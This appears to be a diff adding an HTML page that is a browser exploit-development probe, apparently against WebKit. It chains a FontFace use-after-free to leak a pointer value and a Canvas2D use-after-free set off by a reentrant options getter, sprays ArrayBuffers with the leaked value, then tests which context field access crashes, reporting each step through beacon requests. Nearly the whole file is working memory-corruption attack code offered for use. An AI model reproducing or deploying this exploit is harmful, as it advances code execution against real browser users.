@@ -1,0 +1,274 @@
+<!--
+  p649j: Canvas2D forge — field-by-field diagnostic
+
+  p649i pattern A crashed on lineWidth. Pattern B didn't run (FontFace warm-reload fail).
+
+  This probe tests WHICH C++ field access crashes. Instead of going straight to
+  lineWidth, we test incrementally:
+
+  1. typeof / constructor / 'lineWidth' in — JS-only (no C++ access)
+  2. createLinearGradient(0,0,1,1) — factory method that does NOT access this.* members
+  3. innerCtx.canvas — accesses m_canvas pointer field (NOT state stack)
+  4. innerCtx.lineWidth — accesses state() → m_stateStack
+
+  If #2 works but #3 crashes → m_canvas pointer dereference kills
+  If #3 works but #4 crashes → state stack access kills
+  If #2 crashes → binding infrastructure accesses C++ before method body
+
+  Also: Pattern B as standalone (no sessionStorage retry)
+  Pattern B: {1, 1, T_lo, T_hi} × 48 — covers m_stateStack at offset ≡ 8 mod 16
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p649j</title></head>
+<body>p649j: field diagnostic
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+var retained = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P649J-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+var f64 = new Float64Array(1);
+var u8f = new Uint8Array(f64.buffer);
+function d2hex(d) {
+  f64[0] = d;
+  var h = '';
+  for (var i = 7; i >= 0; i--) h += ('0' + u8f[i].toString(16)).slice(-2);
+  return h;
+}
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', navigator.userAgent ? navigator.userAgent.slice(0,60) : 'no-ua');
+flush();
+
+// ================================================================
+// PHASE 1: FontFace UAF → leak T
+// ================================================================
+var ffA = new FontFace('ff0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+retained.push(ffA);
+
+var ffStyle = document.createElement('style');
+ffStyle.textContent = "@font-face { font-family: ffs0; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(ffStyle);
+
+var ffFired = false;
+var ffBufs = [];
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffFired) return undefined;
+    ffFired = true;
+    ffStyle.remove();
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    for (var i = 0; i < 64; i++) {
+      var ab = new ArrayBuffer(192);
+      ffBufs.push(new Uint8Array(ab));
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+document.fonts.load('1em ff0, ffs0', 'AB');
+
+setTimeout(function() {
+try {
+  var T_lo = 0, T_hi = 0;
+  var ffHit = -1;
+
+  for (var i = 0; i < ffBufs.length; i++) {
+    var v = ffBufs[i];
+    var nonzero = 0;
+    for (var j = 0; j < 192; j++) if (v[j] !== 0) nonzero++;
+    if (nonzero > 0) {
+      ffHit = i;
+      var dv = new DataView(v.buffer);
+      T_lo = dv.getUint32(0x58, true);
+      T_hi = dv.getUint32(0x5C, true);
+      emit('FF-HIT', 'buf[' + i + '] T=0x' + hex32(T_hi) + hex32(T_lo));
+      break;
+    }
+  }
+  if (ffHit < 0) {
+    emit('FF-MISS', 'ABORT');
+    flush();
+    return;
+  }
+  flush();
+
+  // ================================================================
+  // PHASE 2: Canvas2D UAF
+  // ================================================================
+  var uafCanvas = document.createElement('canvas');
+  uafCanvas.width = 1; uafCanvas.height = 1;
+
+  var innerCtx = null;
+  var gFired = false;
+  var cvOpts = {};
+  Object.defineProperty(cvOpts, 'alpha', {
+    get: function() {
+      gFired = true;
+      innerCtx = uafCanvas.getContext('2d');
+      return true;
+    }
+  });
+
+  try { uafCanvas.getContext('bitmaprenderer', cvOpts); } catch(e) {}
+
+  emit('CV-UAF', 'ok=' + gFired + ' inner=' + !!innerCtx);
+  flush();
+  if (!innerCtx) { emit('ABORT', 'no ctx'); flush(); return; }
+
+  // ================================================================
+  // PHASE 3: AB(768) spray — Pattern A uniform
+  // {T_lo, T_hi, 1, 1} × 48 across all 768 bytes
+  // ================================================================
+  var AB_N = 300;
+  var abViews = [];
+
+  var tmpl = new ArrayBuffer(768);
+  var tmplDV = new DataView(tmpl);
+  var tmplU8 = new Uint8Array(tmpl);
+
+  for (var off = 0; off < 768; off += 16) {
+    tmplDV.setUint32(off + 0, T_lo, true);
+    tmplDV.setUint32(off + 4, T_hi, true);
+    tmplDV.setUint32(off + 8, 1, true);
+    tmplDV.setUint32(off + 12, 1, true);
+  }
+
+  for (var i = 0; i < AB_N; i++) {
+    var ab = new ArrayBuffer(768);
+    new Uint8Array(ab).set(tmplU8);
+    abViews.push(new Uint8Array(ab));
+    retained.push(ab);
+  }
+
+  emit('SPRAY', AB_N + ' patA T=0x' + hex32(T_hi) + hex32(T_lo));
+  flush();
+
+  // ================================================================
+  // PHASE 4: FIELD-BY-FIELD diagnostic
+  // Each test has a beacon BEFORE and AFTER. If only BEFORE arrives,
+  // that specific access crashed WebProcess.
+  // ================================================================
+
+  // Test 1: typeof (pure JS — no C++ object access)
+  emit('T1-PRE', 'typeof');
+  flush();
+  var r1 = typeof innerCtx;
+  emit('T1-OK', r1);
+  flush();
+
+  // Test 2: 'lineWidth' in (Structure lookup — no C++ access)
+  emit('T2-PRE', 'in-check');
+  flush();
+  var r2 = ('lineWidth' in innerCtx);
+  emit('T2-OK', String(r2));
+  flush();
+
+  // Test 3: createLinearGradient — factory, should NOT access C++ this.*
+  emit('T3-PRE', 'createLG');
+  flush();
+  var r3 = false;
+  try {
+    var grad = innerCtx.createLinearGradient(0, 0, 100, 100);
+    r3 = !!grad;
+    emit('T3-OK', 'grad=' + r3 + ' type=' + typeof grad);
+  } catch(e) {
+    emit('T3-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // Test 4: canvas property — accesses m_canvas pointer (NOT state stack)
+  emit('T4-PRE', 'canvas');
+  flush();
+  try {
+    var cv = innerCtx.canvas;
+    emit('T4-OK', 'canvas=' + typeof cv + ' w=' + (cv ? cv.width : 'null'));
+  } catch(e) {
+    emit('T4-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // Test 5: globalCompositeOperation — state getter returning STRING (enum)
+  emit('T5-PRE', 'compositeOp');
+  flush();
+  try {
+    var gco = innerCtx.globalCompositeOperation;
+    emit('T5-OK', 'gco=' + gco);
+  } catch(e) {
+    emit('T5-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // Test 6: lineWidth — state getter returning float
+  emit('T6-PRE', 'lineWidth');
+  flush();
+  try {
+    var lw = innerCtx.lineWidth;
+    emit('T6-OK', 'lw=' + lw + ' h=' + d2hex(lw));
+  } catch(e) {
+    emit('T6-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // Test 7: globalAlpha — another state float
+  emit('T7-PRE', 'globalAlpha');
+  flush();
+  try {
+    var ga = innerCtx.globalAlpha;
+    emit('T7-OK', 'ga=' + ga + ' h=' + d2hex(ga));
+  } catch(e) {
+    emit('T7-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // Test 8: getTransform — state getter returning DOMMatrix (6 doubles)
+  emit('T8-PRE', 'getTransform');
+  flush();
+  try {
+    var xf = innerCtx.getTransform();
+    emit('T8-OK', 'a=' + d2hex(xf.a) + ' d=' + d2hex(xf.d));
+  } catch(e) {
+    emit('T8-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // If we got here, scan for modifications
+  var modAB = -1;
+  for (var ai = 0; ai < abViews.length; ai++) {
+    var v = abViews[ai];
+    for (var off = 0; off < 768; off++) {
+      if (v[off] !== tmplU8[off]) { modAB = ai; break; }
+    }
+    if (modAB >= 0) break;
+  }
+  emit('MOD', modAB >= 0 ? 'AB[' + modAB + ']' : 'none');
+
+  emit('DONE', 'all-tests-passed');
+  flush();
+
+} catch(topErr) { emit('FATAL', String(topErr).slice(0,200)); flush(); }
+}, 0);
+})();
+</script>
+</body></html>
